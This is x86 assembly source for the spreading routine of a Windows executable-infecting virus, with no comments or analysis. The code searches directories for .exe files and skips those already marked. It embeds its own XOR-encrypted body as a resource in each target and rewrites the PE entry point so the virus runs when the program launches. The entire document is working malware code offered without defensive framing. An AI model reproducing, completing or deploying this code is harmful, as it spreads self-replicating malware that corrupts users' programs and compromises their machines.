.code


infect :
jmp nfkt_code
v_file dd 0
image_base dd 0
old_eip dd 0

v_filehandle dd 0
v_mem dd 0
v_size dd 0
bwr dd 0
w32_data dd 0
exe_ db "*.exe",0
fexe_handle dd 0
serch32_data dd 0
serch_dir db "*.*",0
serch_dir_handle dd 0
mark0 dd 0

nfkt_code:
search_dir:



push [ebp+offset buffer]
push 512
call dword ptr [ebp+offset AGetCurrentDirectoryF]
or eax,eax
jz exit_search_dir

mov eax,sizeof WIN32_FIND_DATA

push eax
push 0
call dword ptr[ebp+offset AGlobalAllocF]
or eax,eax
jz exit_search_dir
mov [ebp+offset serch32_data],eax


push [ebp+offset serch32_data]
mov eax,offset serch_dir 
add eax,ebp
push eax
call dword ptr [ebp+offset AFindFirstFileF]
cmp eax,INVALID_HANDLE_VALUE
je exit_search_dir
mov [ebp+offset serch_dir_handle],eax
mov eax,[ebp+offset serch32_data]
add eax,WIN32_FIND_DATA-274
push eax
call dword ptr [ebp+offset ASetCurrentDirectoryF]
or eax,eax
;jz exit_search_dir
jz horizental
call nfkt_exe


horizental:
cmp [ebp+offset mark0],100
je exit_search_dir
inc [ebp+offset mark0]

push [ebp+offset buffer]
call dword ptr [ebp+offset ASetCurrentDirectoryF]
or eax,eax
jz exit_search_dir


push [ebp+offset serch32_data]
push [ebp+offset serch_dir_handle]
call dword ptr [ebp+offset AFindNextFileF]

mov eax,[ebp+offset serch32_data]
add eax,WIN32_FIND_DATA-274
push eax
call dword ptr [ebp+offset ASetCurrentDirectoryF]
or eax,eax
jz horizental

call nfkt_exe


jmp horizental

exit_no_more_dirs:
push [ebp+offset serch_dir_handle]
call dword ptr [ebp+offset AFindCloseF]



exit_search_dir:

push [ebp+offset buffer]
call dword ptr [ebp+offset ASetCurrentDirectoryF]
ret


nfkt_exe:

mov eax,sizeof WIN32_FIND_DATA

push eax
push 0
call dword ptr[ebp+offset AGlobalAllocF]
or eax,eax
jz exit_nfkt_exe
mov [ebp+offset w32_data],eax
push [ebp+offset w32_data]
mov eax,offset exe_
add eax,ebp
push eax
call dword ptr [ebp+offset AFindFirstFileF]
cmp eax,INVALID_HANDLE_VALUE
je exit_nfkt_exe

mov [ebp+offset fexe_handle],eax
mov eax,[ebp+offset w32_data]
add eax,WIN32_FIND_DATA-274
call nfkt_this

_exe_nfkt0r:

push [ebp+offset w32_data]
push [ebp+offset fexe_handle]
call [ebp+AFindNextFileF]
call [ebp+AGetLastErrorF]
cmp eax,ERROR_NO_MORE_FILES
je no_more_files
mov eax,[ebp+offset w32_data]
add eax,WIN32_FIND_DATA-274
call nfkt_this

jmp _exe_nfkt0r
no_more_files:
push [ebp+offset fexe_handle]
call dword ptr [ebp+offset AFindCloseF]
exit_nfkt_exe:
ret

nfkt_this:


mov [ebp+offset v_file],eax
push [ebp+offset v_file]
call [ebp+offset ALoadLibraryF]
or eax,eax
jz exit_nfkt
mov [ebp+offset bwr],eax

push RT_RCDATA
push 1234
push [ebp+offset bwr]
call [ebp+offset AFindResourceF]
or eax,eax
jnz exit_nfkt

mov esi,dword ptr [ebp+offset bwr]
cmp word ptr [esi],"ZM"
jne exit_nfkt

add esi,[esi+3ch]
cmp word ptr [esi],"EP"
jne exit_nfkt

cmp dword ptr [esi+136],0
je exit_nfkt

mov eax,[esi+40]
mov ebx,[esi+52]
mov [ebp+offset image_base],ebx
mov [ebp+offset old_eip],eax

push [ebp+offset bwr]
call [ebp+offset AFreeLibraryF]


push vir_size
push 0
call dword ptr [ebp+offset AGlobalAllocF]
or eax,eax
je exit_nfkt

mov [ebp+offset v_mem],eax

mov esi,offset Start
add esi,ebp
mov edi,[ebp+offset v_mem]

mov ecx,vir_size
rep movsb

mov ecx,vir_size
sub ecx,stub_size
mov eax,[ebp+offset v_mem]
add eax,stub_size

_encrypt:
xor byte ptr [eax],12
inc eax
loop _encrypt

push FALSE
push [ebp+offset v_file]

call dword ptr [ebp+offset ABeginUpdateResourceF]
or eax,eax
jz exit_nfkt
push eax

push vir_size
;mov ecx,offset Start
;add ecx,ebp
push [ebp+offset v_mem]

push LANG_ENGLISH
push 1234
push RT_RCDATA
push eax
call dword ptr [ebp+offset AUpdateResourceF]
or eax,eax
jz exit_nfkt


pop eax
push FALSE
push eax
call dword ptr [ebp+AEndUpdateResourceF]
or eax,eax
jz exit_nfkt


;//find old_eip and change it

push 0
push 0
push 3
push 0
push 2h
push 40000000h or 80000000h

push [ebp+offset v_file]

call dword ptr [ebp+offset ACreateFileF]
or eax,eax
jz exit

mov [ebp+offset v_filehandle],eax

push 0
push eax
call dword ptr [ebp+offset AGetFileSizeF]
or eax,eax
jz exit_nfkt
mov dword ptr [ebp+offset v_size ],eax

push eax
push 0
call dword ptr [ebp+offset AGlobalAllocF]
or eax,eax
jz exit_nfkt
mov dword ptr [ebp+offset v_mem],eax

push 0

mov eax,offset bwr
add eax,ebp
push eax
push dword ptr [ebp+offset v_size]
push dword ptr [ebp+offset v_mem]

push dword ptr  [ebp+offset v_filehandle]
call dword ptr [ebp+offset AReadFileF]
or eax,eax
jz exit_nfkt

mov esi,dword ptr [ebp+offset v_mem]
cmp word ptr [esi],"ZM"
jne exit_nfkt

add esi,[esi+3ch]
cmp word ptr [esi],"EP"
jne exit_nfkt
push esi


xor ecx,ecx
xor ebx,ebx
mov bx,word ptr [esi+20] ;ebx size of optional header
mov cx,word ptr [esi+6]  ;ecx no. of sections

add esi,24
add esi,ebx

xor ebx,ebx
l00p_rsrc:
cmp dword ptr [esi],"rsr."
je found_rsrc
add esi,40
loop l00p_rsrc
jmp exit_nfkt

found_rsrc:
mov ecx,[esi+16]
mov esi,[esi+20]
add esi,[ebp+offset v_mem]
push ecx

l00p_marker:
cmp word ptr [esi],'kcik'
je here_vir
inc esi
loop l00p_marker
here_vir:

pop edx
sub edx,ecx
sub edx,2

pop edi

add edx,dword ptr [edi+136]
mov dword ptr [edi+40],edx

push 0
push 0
push FILE_BEGIN
push dword ptr [ebp+offset v_filehandle]
call dword ptr [ebp+offset ASetFilePointerF]



push 0

mov eax,offset bwr
add eax,ebp
push eax
push dword ptr [ebp+offset v_size]
push dword ptr [ebp+offset v_mem]

push dword ptr  [ebp+offset v_filehandle]
call dword ptr [ebp+offset AWriteFileF]

 
ret

exit_nfkt:

ret
